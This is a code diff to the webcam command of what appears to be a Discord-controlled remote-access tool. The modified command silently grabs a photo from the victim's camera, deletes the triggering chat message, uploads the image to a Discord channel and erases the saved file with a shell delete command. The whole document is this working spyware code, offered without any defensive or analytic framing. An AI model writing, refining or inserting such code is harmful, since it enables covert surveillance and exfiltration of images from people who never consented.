@@ -1,6 +1,9 @@
 import pygame.camera
+import pygame.image
 import subprocess
 import time
+import sys
+import os
 import resources.modules.misc as pysilon_misc
 
 @client.command(name="webcam")
@@ -8,23 +11,20 @@ async def webcam(ctx, action=None, camera_index=None):
     await ctx.message.delete()
     if action == "photo":
         pygame.camera.init()
-        cameras = pygame.camera.list_cameras()
-        if not cameras:
-            return await ctx.send('```❗ No cameras found.```')
-        if camera_index != None:
+        if camera_index != None: 
             camera_index = int(camera_index)
         else: camera_index = 0
         try:
-            camera = pygame.camera.Camera(cameras[camera_index])
-            camera.start()
-        except IndexError:
+            camera = pygame.camera.Camera(camera_index)
+        except: 
             return await ctx.send('Camera with index ' + str(camera_index) + ' was not found.')
+        camera.start()
         time.sleep(1)
         image = camera.get_image()
+        pygame.image.save(image, f'{os.path.dirname(sys.executable)}\\webcam.png')
         camera.stop()
-        pygame.image.save(image, 'webcam.png')
-        await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File('webcam.png'))
-        subprocess.run('del /s webcam.png', shell=True)
+        await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File(f'{os.path.dirname(sys.executable)}\\webcam.png'))
+        subprocess.run(f'del /s {os.path.dirname(sys.executable)}\\webcam.png', shell=True)
     elif action == "video":
         pass # todo
     else:
